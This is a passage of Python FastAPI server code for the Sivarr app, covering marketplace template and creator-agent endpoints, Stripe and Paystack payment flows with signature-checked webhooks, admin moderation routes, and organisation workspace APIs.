        return {"owned": False}
    entry = get_session_from_token(sanitize_text(token, 100))
    if not entry:
        return {"owned": False}
    return {"owned": db.check_download(entry["sid"], template_id)}


# ── Safety: report / flag a template (Stage 9) ────────────────
@app.post("/api/agents/templates/{template_id}/report")
async def ag_report_template(template_id: str, data: dict):
    """A signed-in user flags a marketplace template for moderation review.
    Stored in the `agent_reports` collection (owner = template_id). One row per
    reporter+template (re-reporting updates the reason). Admin reviews via
    /api/admin/agents/reports."""
    sid, name = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    reason = sanitize_text(str(data.get("reason", "")), 500)
    if not reason:
        raise HTTPException(400, "A reason is required.")
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    db.coll_put("agent_reports", f"{template_id}:{sid}", {
        "template_id": template_id,
        "reporter_sid": sid,
        "reporter_name": name,
        "reason": reason,
        "status": "open",
        "ts": datetime.datetime.now().isoformat(),
    }, owner=template_id)
    return {"ok": True}


@app.get("/api/admin/agents/reports")
async def ag_admin_list_reports(token: str = ""):
    if not _is_valid_admin_session(sanitize_text(token, 100)):
        raise HTTPException(401, "Unauthorized")
    if not db.is_available():
        return {"reports": []}
    return {"reports": db.coll_list("agent_reports")}


# ── Agent application ─────────────────────────────────────────

@app.post("/api/agents/apply")
async def ag_apply(data: dict):
    sid, name = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    existing = db.get_agent_by_user(sid)
    if existing:
        raise HTTPException(400, "You already have an agent profile.")
    display_name = sanitize_text(str(data.get("display_name", name)), 100)
    bio          = sanitize_text(str(data.get("bio", "")), 400)
    speciality   = [sanitize_text(str(s),50) for s in (data.get("speciality") or [])[:6]]
    stripe_email = sanitize_text(str(data.get("stripe_email", "")), 200)
    country      = sanitize_text(str(data.get("country","US")), 3)

    agent_id = uuid.uuid4().hex[:20]
    stripe_account_id = None
    onboarding_url = None

    if STRIPE_AVAILABLE and stripe_email:
        try:
            account = stripe.Account.create(
                type="express", country=country, email=stripe_email,
                capabilities={"transfers": {"requested": True}},
            )
            stripe_account_id = account.id
            link = stripe.AccountLink.create(
                account=account.id,
                refresh_url=f"{BASE_URL}/agents/apply?step=stripe",
                return_url=f"{BASE_URL}/agents/dashboard?onboarded=true",
                type="account_onboarding",
            )
            onboarding_url = link.url
        except Exception as e:
            log.warning(f"Stripe Connect create failed: {e}")

    db.create_agent({
        "id": agent_id, "user_sid": sid, "display_name": display_name,
        "bio": bio, "speciality": speciality,
        "stripe_account_id": stripe_account_id,
        "status": "stripe_pending" if stripe_account_id else "applied",
    })
    return {"ok": True, "agent_id": agent_id, "onboarding_url": onboarding_url}


@app.get("/api/agents/me")
async def ag_me(token: str = ""):
    if not token or not db.is_available():
        return {"agent": None}
    entry = get_session_from_token(sanitize_text(token, 100))
    if not entry:
        return {"agent": None}
    agent = db.get_agent_by_user(entry["sid"])
    return {"agent": agent or None}


@app.put("/api/agents/me")
async def ag_update_me(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    agent = db.get_agent_by_user(sid)
    if not agent:
        raise HTTPException(404, "No agent profile found.")
    fields = {}
    for k in ("display_name","bio","speciality"):
        if k in data:
            fields[k] = sanitize_text(str(data[k]),200) if isinstance(data[k],str) \
                        else data[k]
    db.update_agent(agent["id"], fields)
    return {"ok": True}


# ── Agent's own templates ─────────────────────────────────────

@app.get("/api/agents/me/templates")
async def ag_my_templates(token: str = ""):
    if not token or not db.is_available():
        return {"templates": []}
    entry = get_session_from_token(sanitize_text(token,100))
    if not entry:
        return {"templates": []}
    agent = db.get_agent_by_user(entry["sid"])
    if not agent:
        return {"templates": []}
    return {"templates": db.get_agent_templates(agent["id"], include_drafts=True)}


@app.post("/api/agents/me/templates")
async def ag_create_template(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    agent = db.get_agent_by_user(sid)
    if not agent or agent.get("status") != "active":
        raise HTTPException(403, "Active agent account required.")
    tpl_id = uuid.uuid4().hex[:20]
    tpl = {
        "id":                tpl_id,
        "agent_id":          agent["id"],
        "name":              sanitize_text(str(data.get("name","Untitled")),100),
        "short_description": sanitize_text(str(data.get("short_description","")),200),
        "full_description":  sanitize_text(str(data.get("full_description","")),800),
        "category":          sanitize_text(str(data.get("category","workspace")),50),
        "tags":              [sanitize_text(str(t),50) for t in (data.get("tags") or [])[:5]],
        "thumbnail_color":   sanitize_text(str(data.get("thumbnail_color","#4f6ef7")),20),
        "price":             max(0.0, float(data.get("price",0))),
        "price_ngn":         float(data["price_ngn"]) if data.get("price_ngn") is not None else None,
        "contents":          data.get("contents") or {},
        "included_items":    data.get("included_items") or [],
        "status":            "draft",
    }
    db.create_template(tpl)
    return {"ok": True, "template_id": tpl_id}


@app.put("/api/agents/me/templates/{template_id}")
async def ag_update_template(template_id: str, data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    agent = db.get_agent_by_user(sid)
    if not agent:
        raise HTTPException(403, "No agent profile.")
    fields = {}
    for k in ("name","short_description","full_description","category","tags",
              "thumbnail_color","price","price_ngn","contents","included_items"):
        if k in data:
            fields[k] = data[k]
    if "price" in fields:
        fields["price"] = max(0.0, float(fields["price"]))
    if "price_ngn" in fields:
        fields["price_ngn"] = float(fields["price_ngn"]) if fields["price_ngn"] is not None else None
    db.update_template(template_id, agent["id"], fields)
    return {"ok": True}


@app.delete("/api/agents/me/templates/{template_id}")
async def ag_delete_template(template_id: str, data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    agent = db.get_agent_by_user(sid)
    if not agent:
        raise HTTPException(403, "No agent profile.")
    db.delete_template(template_id, agent["id"])
    return {"ok": True}


@app.post("/api/agents/me/templates/{template_id}/publish")
async def ag_publish_template(template_id: str, data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    agent = db.get_agent_by_user(sid)
    if not agent or agent.get("status") != "active":
        raise HTTPException(403, "Active agent account required.")
    db.update_template(template_id, agent["id"], {"status": "published"})
    _rc_bust("tmpl:")
    return {"ok": True}


# ── Earnings & payouts ────────────────────────────────────────

@app.get("/api/agents/me/earnings")
async def ag_earnings(token: str = ""):
    if not token or not db.is_available():
        return {"monthly": [], "by_template": []}
    entry = get_session_from_token(sanitize_text(token,100))
    if not entry:
        return {"monthly": [], "by_template": []}
    agent = db.get_agent_by_user(entry["sid"])
    if not agent:
        return {"monthly": [], "by_template": []}
    data = db.get_agent_earnings(agent["id"])
    data["agent"] = agent
    return data


@app.get("/api/agents/me/payouts")
async def ag_payouts(token: str = ""):
    if not token or not db.is_available():
        return {"payouts": []}
    entry = get_session_from_token(sanitize_text(token,100))
    if not entry:
        return {"payouts": []}
    agent = db.get_agent_by_user(entry["sid"])
    if not agent:
        return {"payouts": []}
    return {"payouts": db.get_payouts(agent["id"])}


@app.get("/api/agents/me/reviews")
async def ag_my_reviews(token: str = ""):
    if not token or not db.is_available():
        return {"reviews": []}
    entry = get_session_from_token(sanitize_text(token,100))
    if not entry:
        return {"reviews": []}
    agent = db.get_agent_by_user(entry["sid"])
    if not agent:
        return {"reviews": []}
    return {"reviews": db.get_agent_reviews(agent["id"])}


# ── Social ────────────────────────────────────────────────────

@app.post("/api/agents/{agent_id}/follow")
async def ag_follow(agent_id: str, data: dict):
    sid, _ = _resolve_token(data)
    agent_id = sanitize_text(agent_id, 60)
    if db.is_available():
        db.follow_agent(sid, agent_id)
    return {"ok": True}


@app.delete("/api/agents/{agent_id}/follow")
async def ag_unfollow(agent_id: str, data: dict):
    sid, _ = _resolve_token(data)
    agent_id = sanitize_text(agent_id, 60)
    if db.is_available():
        db.unfollow_agent(sid, agent_id)
    return {"ok": True}


@app.post("/api/agents/templates/{template_id}/review")
async def ag_add_review(template_id: str, data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    if not db.check_download(sid, template_id):
        raise HTTPException(403, "Must own template to review.")
    rating = int(data.get("rating", 5))
    if not (1 <= rating <= 5):
        raise HTTPException(400, "Rating must be 1–5.")
    review = {
        "id": uuid.uuid4().hex[:20],
        "template_id": template_id,
        "reviewer_sid": sid,
        "rating": rating,
        "review_text": sanitize_text(str(data.get("review_text","")), 500),
    }
    db.add_review(review)
    return {"ok": True}


# ── Payment (Stripe) ──────────────────────────────────────────

@app.post("/api/payments/checkout")
async def ag_checkout(data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(str(data.get("template_id","")), 60)
    if not template_id or not db.is_available():
        raise HTTPException(400, "template_id required.")
    t = db.get_template_by_id(template_id)
    if not t:
        raise HTTPException(404, "Template not found.")
    if float(t.get("price",0)) == 0:
        # Free — install directly
        if not db.check_download(sid, template_id):
            dl_id = uuid.uuid4().hex[:20]
            db.record_download({
                "id": dl_id, "template_id": template_id, "buyer_sid": sid,
                "agent_id": t["agent_id"], "gross_amount": 0,
                "sivarr_fee": 0, "agent_earnings": 0, "status": "completed",
            })
        return {"status": "installed", "contents": t.get("contents",{})}
    if not STRIPE_AVAILABLE:
        raise HTTPException(503, "Payment processing not configured.")
    agent = db.get_agent_by_id(t["agent_id"])
    try:
        session = stripe.checkout.Session.create(
            payment_method_types=["card"],
            line_items=[{
                "price_data": {
                    "currency": "usd",
                    "unit_amount": int(float(t["price"]) * 100),
                    "product_data": {
                        "name": t["name"],
                        "description": f"Sivarr template by {agent.get('display_name','') if agent else ''}",
                    },
                },
                "quantity": 1,
            }],
            mode="payment",
            success_url=f"{BASE_URL.rstrip('/')}/app?payment=success&template={template_id}",
            cancel_url=f"{BASE_URL}/?payment=cancelled&template={template_id}",
            metadata={
                "template_id": template_id,
                "buyer_sid":   sid,
                "agent_id":    t["agent_id"],
            },
        )
        return {"checkout_url": session.url}
    except Exception as e:
        log.error(f"Stripe checkout error: {e}")
        raise HTTPException(500, "Payment session creation failed.")


@app.post("/api/webhooks/stripe")
async def ag_stripe_webhook(request: Request):
    payload    = await request.body()
    sig_header = request.headers.get("stripe-signature", "")
    if not STRIPE_AVAILABLE:
        raise HTTPException(503, "Stripe not configured.")
    try:
        event = stripe.Webhook.construct_event(
            payload, sig_header, STRIPE_WEBHOOK_SECRET
        )
    except ValueError:
        raise HTTPException(400, "Invalid payload.")
    except Exception:
        raise HTTPException(400, "Invalid signature.")
    if event["type"] == "checkout.session.completed":
        session     = event["data"]["object"]
        template_id = session["metadata"].get("template_id","")
        buyer_sid   = session["metadata"].get("buyer_sid","")
        agent_id    = session["metadata"].get("agent_id","")
        amount_cents = int(session.get("amount_total",0))
        gross   = amount_cents / 100
        fee     = round(gross * 0.10, 2)
        net     = round(gross * 0.90, 2)
        if template_id and buyer_sid and not db.check_download(buyer_sid, template_id):
            dl_id = uuid.uuid4().hex[:20]
            db.record_download({
                "id": dl_id, "template_id": template_id, "buyer_sid": buyer_sid,
                "agent_id": agent_id, "gross_amount": gross, "sivarr_fee": fee,
                "agent_earnings": net, "stripe_session_id": session.get("id",""),
                "status": "completed",
            })
            if agent_id:
                db.add_agent_earnings(agent_id, net)
    return {"received": True}


# ── Admin — agents controls ───────────────────────────────────

@app.post("/api/admin/agents/{agent_id}/verify")
async def ag_admin_verify(agent_id: str, data: dict):
    if not _is_valid_admin_session(str(data.get("token",""))):
        raise HTTPException(401, "Unauthorized")
    agent_id = sanitize_text(agent_id, 60)
    if db.is_available():
        db.update_agent(agent_id, {"verified": True, "status": "active"})
    return {"ok": True}


@app.post("/api/admin/agents/{agent_id}/suspend")
async def ag_admin_suspend(agent_id: str, data: dict):
    if not _is_valid_admin_session(str(data.get("token",""))):
        raise HTTPException(401, "Unauthorized")
    agent_id = sanitize_text(agent_id, 60)
    if db.is_available():
        db.update_agent(agent_id, {"status": "suspended"})
    return {"ok": True}


@app.post("/api/admin/templates/{template_id}/approve")
async def ag_admin_approve_template(template_id: str, data: dict):
    if not _is_valid_admin_session(str(data.get("token",""))):
        raise HTTPException(401, "Unauthorized")
    template_id = sanitize_text(template_id, 60)
    if db.is_available():
        t = db.get_template_by_id(template_id)
        if t:
            db.update_template(template_id, t["agent_id"], {"status": "published"})
            _rc_bust("tmpl:")
    return {"ok": True}


# ── Demo data (shown when DB unavailable) ─────────────────────

def _ag_demo_templates() -> list:
    return [
        {
            "id": "demo_1", "name": "Student OS Pro",
            "short_description": "Complete workspace for high-achieving students",
            "category": "workspace", "price": 0, "download_count": 1240,
            "avg_rating": 4.8, "review_count": 94, "status": "published",
            "thumbnail_color": "#4f6ef7", "agent_name": "Sivarr Team",
            "agent_verified": True, "tags": ["workspace","productivity"],
            "agent_id": "demo_agent_1",
        },
        {
            "id": "demo_2", "name": "Exam Prep Deck: STEM",
            "short_description": "500 flashcards across Maths, Physics and Chemistry",
            "category": "study_decks", "price": 4.99, "download_count": 872,
            "avg_rating": 4.9, "review_count": 61, "status": "published",
            "thumbnail_color": "#d97706", "agent_name": "StudyMaster",
            "agent_verified": True, "tags": ["flashcards","stem"],
            "agent_id": "demo_agent_2",
        },
        {
            "id": "demo_3", "name": "90-Day Goal System",
            "short_description": "Pre-built goals, habit stack and weekly review",
            "category": "goals", "price": 2.99, "download_count": 563,
            "avg_rating": 4.7, "review_count": 38, "status": "published",
            "thumbnail_color": "#22c55e", "agent_name": "GrowthLab",
            "agent_verified": False, "tags": ["goals","habits"],
            "agent_id": "demo_agent_3",
        },
        {
            "id": "demo_4", "name": "AI Prompt Pack: Essays",
            "short_description": "100 prompts for academic writing and research",
            "category": "ai_prompts", "price": 1.99, "download_count": 421,
            "avg_rating": 4.6, "review_count": 29, "status": "published",
            "thumbnail_color": "#6b7280", "agent_name": "PromptCraft",
            "agent_verified": False, "tags": ["ai","writing"],
            "agent_id": "demo_agent_4",
        },
        {
            "id": "demo_5", "name": "Gratitude Journal System",
            "short_description": "31 journal prompts + reflection framework",
            "category": "journal", "price": 0, "download_count": 318,
            "avg_rating": 4.5, "review_count": 22, "status": "published",
            "thumbnail_color": "#7f77dd", "agent_name": "MindfulStudy",
            "agent_verified": False, "tags": ["journal","wellbeing"],
            "agent_id": "demo_agent_5",
        },
        {
            "id": "demo_6", "name": "Founder OS",
            "short_description": "Org space template for solo founders and small teams",
            "category": "workspace", "price": 9.99, "download_count": 247,
            "avg_rating": 4.9, "review_count": 18, "status": "published",
            "thumbnail_color": "#4f6ef7", "agent_name": "BuildFast",
            "agent_verified": True, "tags": ["founders","startup"],
            "agent_id": "demo_agent_6",
        },
    ]


# ── Payment config (public) ───────────────────────────────────

@app.get("/api/config/payment")
async def payment_config():
    """Return public payment keys + Naira rate. Safe to expose."""
    return {
        "paystack_public_key": PAYSTACK_PUBLIC_KEY,
        "paystack_available":  PAYSTACK_AVAILABLE,
        "stripe_available":    STRIPE_AVAILABLE,
        "naira_rate":          get_naira_rate(),
    }


# ── Paystack — NGN payments ───────────────────────────────────

@app.post("/api/payments/paystack/initialize")
async def paystack_initialize(data: dict):
    """Create a Paystack transaction and return the authorization URL + reference."""
    sid, _ = _resolve_token(data)
    if not PAYSTACK_AVAILABLE:
        raise HTTPException(503, "Paystack not configured.")
    template_id = sanitize_text(str(data.get("template_id","")), 60)
    email       = sanitize_text(str(data.get("email", "")), 200)
    if not template_id:
        raise HTTPException(400, "template_id required.")
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    t = db.get_template_by_id(template_id)
    if not t:
        raise HTTPException(404, "Template not found.")

    # Determine NGN price
    price_usd = float(t.get("price", 0))
    price_ngn = t.get("price_ngn") or round(price_usd * get_naira_rate(), 2)
    if price_ngn == 0:
        # Free — install directly
        if not db.check_download(sid, template_id):
            dl_id = uuid.uuid4().hex[:20]
            db.record_download({
                "id": dl_id, "template_id": template_id, "buyer_sid": sid,
                "agent_id": t["agent_id"], "gross_amount": 0,
                "sivarr_fee": 0, "agent_earnings": 0, "status": "completed",
            })
        return {"status": "installed", "contents": t.get("contents", {})}

    amount_kobo = int(price_ngn * 100)  # Paystack uses kobo
    reference   = f"siv_{uuid.uuid4().hex[:16]}"

    payload = {
        "email":       email or f"buyer_{sid}@sivarr.com",
        "amount":      amount_kobo,
        "currency":    "NGN",
        "reference":   reference,
        "callback_url": f"{BASE_URL.rstrip('/')}/app?payment=success&template={template_id}&gateway=paystack&ref={reference}",
        "metadata": {
            "template_id": template_id,
            "buyer_sid":   sid,
            "agent_id":    t["agent_id"],
            "price_usd":   str(price_usd),
            "price_ngn":   str(price_ngn),
        },
    }
    headers = {
        "Authorization": f"Bearer {PAYSTACK_SECRET_KEY}",
        "Content-Type":  "application/json",
    }
    if not HTTPX_AVAILABLE:
        raise HTTPException(503, "HTTP client unavailable.")
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(f"{PAYSTACK_API}/transaction/initialize",
                                     json=payload, headers=headers)
        result = resp.json()
    except Exception as e:
        log.error(f"Paystack initialize error: {e}")
        raise HTTPException(502, "Paystack API unreachable.")
    if not result.get("status"):
        raise HTTPException(400, result.get("message", "Paystack error."))
    return {
        "authorization_url": result["data"]["authorization_url"],
        "access_code":       result["data"]["access_code"],
        "reference":         reference,
        "amount_kobo":       amount_kobo,
        "price_ngn":         price_ngn,
    }


@app.get("/api/payments/paystack/verify/{reference}")
async def paystack_verify(reference: str, token: str = ""):
    """Verify a Paystack transaction by reference and install the template."""
    reference = sanitize_text(reference, 80)
    if not PAYSTACK_AVAILABLE or not HTTPX_AVAILABLE:
        raise HTTPException(503, "Paystack not configured.")
    if not reference:
        raise HTTPException(400, "reference required.")

    # Resolve user
    sid = None
    if token:
        entry = get_session_from_token(sanitize_text(token, 100))
        if entry:
            sid = entry["sid"]

    # Call Paystack verify endpoint
    headers = {"Authorization": f"Bearer {PAYSTACK_SECRET_KEY}"}
    try:
        async with _httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(f"{PAYSTACK_API}/transaction/verify/{reference}",
                                    headers=headers)
        result = resp.json()
    except Exception as e:
        log.error(f"Paystack verify error: {e}")
        raise HTTPException(502, "Paystack API unreachable.")

    if not result.get("status"):
        raise HTTPException(400, result.get("message","Verification failed."))

    tx = result["data"]
    if tx.get("status") != "success":
        raise HTTPException(402, "Payment not completed.")

    meta        = tx.get("metadata", {})
    template_id = meta.get("template_id","") or sanitize_text(str(tx.get("template_id","")),60)
    # Never trust client-supplied buyer_sid from metadata; use only the authenticated session.
    buyer_sid   = sid or ""
    agent_id    = meta.get("agent_id","")
    amount_kobo = int(tx.get("amount", 0))
    price_ngn   = amount_kobo / 100
    price_usd   = price_ngn / get_naira_rate()

    if not template_id or not db.is_available():
        return {"ok": True, "verified": True, "contents": {}}

    # Idempotency — don't double-install
    if db.check_payment_reference(reference):
        t = db.get_template_by_id(template_id)
        return {"ok": True, "already_processed": True, "contents": t.get("contents",{}) if t else {}}

    if buyer_sid and not db.check_download(buyer_sid, template_id):
        t = db.get_template_by_id(template_id)
        agent_id = agent_id or (t.get("agent_id","") if t else "")
        net = round(price_usd * 0.90, 4)
        fee = round(price_usd * 0.10, 4)
        dl_id = uuid.uuid4().hex[:20]
        db.record_download({
            "id": dl_id, "template_id": template_id, "buyer_sid": buyer_sid,
            "agent_id": agent_id, "gross_amount": price_usd, "sivarr_fee": fee,
            "agent_earnings": net, "stripe_session_id": reference, "status": "completed",
        })
        if agent_id:
            db.add_agent_earnings(agent_id, net)
        t = db.get_template_by_id(template_id)
        return {"ok": True, "contents": t.get("contents",{}) if t else {}}

    t = db.get_template_by_id(template_id)
    return {"ok": True, "contents": t.get("contents",{}) if t else {}}


@app.post("/api/webhooks/paystack")
async def paystack_webhook(request: Request):
    """Paystack webhook — HMAC-SHA512 verified."""
    payload    = await request.body()
    sig_header = request.headers.get("x-paystack-signature", "")

    if not PAYSTACK_SECRET_KEY:
        raise HTTPException(503, "Paystack not configured.")

    expected = hmac.new(PAYSTACK_SECRET_KEY.encode(), payload, hashlib.sha512).hexdigest()
    if not hmac.compare_digest(sig_header, expected):
        raise HTTPException(400, "Invalid signature.")

    try:
        event = json.loads(payload)
    except Exception:
        raise HTTPException(400, "Invalid JSON.")

    if event.get("event") == "charge.success":
        tx        = event.get("data", {})
        meta      = tx.get("metadata", {})
        reference = tx.get("reference","")
        template_id = meta.get("template_id","")
        buyer_sid   = meta.get("buyer_sid","")
        agent_id    = meta.get("agent_id","")
        amount_kobo = int(tx.get("amount", 0))
        price_ngn   = amount_kobo / 100
        price_usd   = price_ngn / get_naira_rate()

        if template_id and buyer_sid and db.is_available():
            if not db.check_payment_reference(reference):
                if not db.check_download(buyer_sid, template_id):
                    t = db.get_template_by_id(template_id)
                    aid = agent_id or (t.get("agent_id","") if t else "")
                    net = round(price_usd * 0.90, 4)
                    fee = round(price_usd * 0.10, 4)
                    dl_id = uuid.uuid4().hex[:20]
                    db.record_download({
                        "id": dl_id, "template_id": template_id, "buyer_sid": buyer_sid,
                        "agent_id": aid, "gross_amount": price_usd, "sivarr_fee": fee,
                        "agent_earnings": net, "stripe_session_id": reference, "status": "completed",
                    })
                    if aid:
                        db.add_agent_earnings(aid, net)
                    log.info(f"Paystack: installed template {template_id} for {buyer_sid}")

    return {"received": True}


# ═══════════════════════════════════════════════════════════════
#  ORG SPACE — Multi-user organisation API
# ═══════════════════════════════════════════════════════════════

@app.post("/api/org/get")
async def org_get(data: dict):
    """Return the org the current user belongs to, or null."""
    sid, name = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    db.init_db()  # cheap no-op once schema is ready; guards the cold-boot race
    org = await asyncio.to_thread(db.get_org_by_member, sid)
    if not org:
        return {"org": None}
    # These six reads are independent — run them concurrently (each grabs its own
    # pooled connection) instead of six sequential cross-region round-trips, and
    # off the event loop so the worker stays responsive.
    members, tasks, projects, docs, goals, founder = await asyncio.gather(
        asyncio.to_thread(db.get_org_members,  org["id"]),
        asyncio.to_thread(db.get_org_tasks,    org["id"]),
        asyncio.to_thread(db.get_org_projects, org["id"]),
        asyncio.to_thread(db.get_org_docs,     org["id"]),
        asyncio.to_thread(db.get_org_goals,    org["id"]),
        asyncio.to_thread(db.get_org_founder,  org["id"]),
    )
    _org_sub = (org.get("settings") or {}).get("subscription") or None
    return {
        "org": {
            "id":          org["id"],
            "name":        org["name"],
            "description": org.get("description", ""),
            "logo":        org.get("logo", ""),
            "plan":        org.get("plan", "free"),
            "member_role": org.get("member_role", "member"),
            "owner_sid":   org.get("owner_sid", ""),
            "created_at":  str(org.get("created_at", "")),
            "subscription": _org_sub,
            "sub_active":   _org_sub_active(org),
            "seats_paid":   (_org_sub or {}).get("seats"),
            "seats_used":   len(members),
        },
        "members":  members,
        "tasks":    tasks,
        "projects": projects,
        "docs":     docs,
        "goals":    goals,
        "founder":  founder,
    }


@app.get("/api/org/debug")
async def org_debug(token: str = ""):
    """Full diagnostic: DB state, tables, schema, user row, org row. Requires admin token."""
    if not _is_valid_admin_session(sanitize_text(token, 200)):
        raise HTTPException(401, "Unauthorized")
    out = {}

    # 1. Basic DB connectivity
    out["db_test"] = db.db_test()

    if not out["db_test"].get("ping"):
        return out

    conn = db._get_conn()
    if not conn:
        out["conn"] = "failed"
        return out

    try:
        with conn.cursor() as cur:
            # 2. Which tables exist in the public schema?
            cur.execute("""
                SELECT table_name FROM information_schema.tables
                WHERE table_schema = 'public' ORDER BY table_name
            """)
            out["tables"] = [r[0] for r in cur.fetchall()]

            # 3. Specifically check for org tables
            org_tables = {"orgs", "org_members", "org_tasks", "org_projects",
                          "org_docs", "org_messages", "org_goals", "org_founder"}
            out["org_tables_present"] = [t for t in org_tables if t in out["tables"]]
            out["org_tables_missing"] = [t for t in org_tables if t not in out["tables"]]

        conn.rollback()

        # 4. Try init_db and report result
        try:
            ok = db.init_db()
            out["init_db_result"] = "success" if ok else "failed"
        except Exception as e:
            out["init_db_result"] = f"exception: {e}"

        # 5. If token provided, check the user row and any existing org
        if token:
            entry = get_session_from_token(token)
            if entry:
                sid = entry["sid"]
                out["session_sid"] = sid[:8] + "…"
                with conn.cursor() as cur:
                    cur.execute("SELECT sid, name, email FROM users WHERE sid=%s", (sid,))
                    row = cur.fetchone()
                    out["user_row_in_db"] = bool(row)
                    if row:
                        out["user_name"] = row[1]
                conn.rollback()
                org = db.get_org_by_member(sid)
                out["existing_org"] = org["name"] if org else None
            else:
                out["session"] = "invalid or expired token"

    except Exception as e:
        out["error"] = str(e)
    finally:
        db._release(conn)

    return out


@app.get("/api/context/snapshot")
async def context_snapshot(token: str = ""):
    """Lightweight workspace snapshot for AI context injection."""
    import datetime as _dt
    token = sanitize_text(token, 100)
    if not token:
        raise HTTPException(401, "Token required.")
    entry = get_session_from_token(token)
    if not entry:
        raise HTTPException(401, "Session expired.")
    sid = entry["sid"]

    snap: dict = {"org": None, "date": str(_dt.date.today())}

    if db.is_available():
        try:
            org = db.get_org_by_member(sid)
            if org:
                members      = db.get_org_members(org["id"])
                tasks        = db.get_org_tasks(org["id"], limit=100)
                goals        = db.get_org_goals(org["id"])
                today_str    = str(_dt.date.today())
                open_tasks   = [t for t in tasks if t.get("status") != "done"]
                active_goals = [g for g in goals if g.get("status") == "active"]
                overdue      = [t for t in open_tasks
                                if t.get("due_date") and str(t["due_date"]) < today_str]
                snap["org"] = {
                    "name":          org["name"],
                    "role":          org.get("member_role", "member"),
                    "members":       len(members),
                    "open_tasks":    [t["title"] for t in open_tasks[:6]],
                    "overdue_tasks": [t["title"] for t in overdue[:3]],
                    "active_goals":  [
                        {"title": g["title"], "progress": g.get("progress", 0)}
                        for g in active_goals[:4]
                    ],
                }
        except Exception as e:
            log.warning(f"context_snapshot org fetch failed: {e}")

    return snap


@app.post("/api/org/create")
async def org_create(data: dict, bg: BackgroundTasks):
    sid, uname = _resolve_token(data)
    diag = db.db_test()
    if not diag.get("ping"):
        raise HTTPException(503, f"DB unavailable: {diag.get('error','unknown')}")
    # Ensure schema exists — handles Railway startup race where DB wasn't ready at boot
    db.init_db()
    existing = db.get_org_by_member(sid)
    if existing:
        raise HTTPException(409, "You already belong to an organization.")
    org_name = sanitize_text(str(data.get("name", "")).strip(), 80)
    if not org_name or len(org_name) < 2:
        raise HTTPException(400, "Organization name must be at least 2 characters.")
    org_id = uuid.uuid4().hex[:20]
    ok, err = db.create_org(sid, org_name, org_id, owner_name=uname)
    if not ok:
        log.error(f"org_create failed for {sid}: {err}")
        raise HTTPException(500, f"Failed to create organization: {err or 'check server logs'}")
    log.info(f"Org created: {org_name} ({org_id}) by {sid}")
    return {"ok": True, "org_id": org_id, "name": org_name}


@app.post("/api/user/update")
async def user_update_profile(data: dict):
    """Update the authenticated user's display name and phone."""
    sid, _ = _resolve_token(data)
    name  = sanitize_text(str(data.get("name", "")).strip(), 80)
    phone = sanitize_text(str(data.get("phone", "")).strip(), 30)
    if not name or len(name) < 2:
        raise HTTPException(400, "Name must be at least 2 characters.")
    if db.is_available():
        db.update_user_profile(sid, name, phone)
    # Persist into the progress store too — session/restore reads the name from
    # there, so this is what makes the change show up on the user's OTHER devices.
    try:
        p = load_progress(sid)
        p["name"] = name
        if phone:
            p["phone"] = phone
        save_progress(sid, p)
    except Exception as _e:
        log.warning(f"profile->progress sync skipped for {sid}: {_e}")
    # Also update the in-memory session so name is reflected immediately
    token = sanitize_text(str(data.get("token", "")), 100)
    entry = _session_tokens.get(token)
    if entry:
        entry["name"] = name
    return {"ok": True, "name": name}


@app.post("/api/user/onboarding")
async def user_onboarding(data: dict):
    """Mark onboarding complete and persist the user's chosen role."""
    sid, _ = _resolve_token(data)
    role   = sanitize_text(str(data.get("role", "")), 20)
    allowed_roles = {"student", "founder", "freelancer", "creator"}
    if role not in allowed_roles:
        role = "student"
    if db.is_available():
        db.save_user_blob(sid, "onboarding", {
            "done": True,
            "role": role,
            "completed_at": datetime.datetime.utcnow().isoformat(),
        })
    return {"ok": True, "role": role}


@app.post("/api/org/update")
async def org_update(data: dict):
    sid, actor = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(404, "You don't belong to an organization.")
    if org.get("owner_sid") != sid:
        raise HTTPException(403, "Only the owner can update the organization.")
    updates = {}
    if "name" in data:
        name = sanitize_text(str(data["name"]).strip(), 80)
        if len(name) < 2:
            raise HTTPException(400, "Name must be at least 2 characters.")
        updates["name"] = name
    if "description" in data:
        updates["description"] = sanitize_text(str(data.get("description", "")), 500)
    if not updates:
        raise HTTPException(400, "Nothing to update.")
    db.update_org(org["id"], sid, updates)
    _org_audit(org["id"], sid, actor, "Updated organisation profile")
    return {"ok": True, **updates}


# ── Org settings: member role/remove + audit log (Blueprint Stage 3) ──
def _org_audit(org_id: str, actor_sid: str, actor_name: str, action: str):
    """Append an admin action to the org audit log (collections, owner=org_id)."""
    try:
        aid = uuid.uuid4().hex[:12]
        db.coll_put("org_audit", aid,
                    {"id": aid, "ts": datetime.datetime.utcnow().isoformat(),
                     "actor_sid": actor_sid, "actor": actor_name or "", "action": action},
                    owner=org_id)
    except Exception as exc:
        log.error(f"org audit failed: {exc}")


def _org_member_sid(m: dict) -> str:
    return m.get("sid") or m.get("user_sid") or ""


@app.post("/api/org/member/role")
async def org_member_role(data: dict):
    sid, actor = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(404, "You don't belong to an organization.")
    if org.get("owner_sid") != sid:
        raise HTTPException(403, "Only the owner can change member roles.")
